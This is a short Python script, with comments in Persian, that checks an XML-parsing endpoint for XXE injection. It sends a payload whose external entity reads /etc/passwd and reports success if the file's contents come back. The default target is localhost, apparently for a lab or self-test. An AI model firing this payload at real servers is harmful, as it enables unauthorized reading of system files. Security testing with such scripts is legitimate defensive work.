import requests

def test_xxe(url):
    print("[*] Testing XXE on: " + url)
    
    # ساخت پیلود XML مخرب
    payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>"""
    
    headers = {'Content-Type': 'application/xml'}
    
    try:
        r = requests.post(url, data=payload, headers=headers, timeout=5)
        
        # چک کردن اینکه آیا محتوای فایل پسورد لینوکس برگشته یا نه
        if "root:x:0:0" in r.text:
            print("\n[+] XXE INJECTION FOUND!")
            print("    Successfully retrieved /etc/passwd")
            print("    Response Snippet: " + r.text[:100])
        else:
            print("[-] No XXE detected.")
            
    except Exception as e:
        print("[-] Error: " + str(e))

if __name__ == "__main__":
    target = "http://127.0.0.1:8000/parse-xml"
    test_xxe(target)
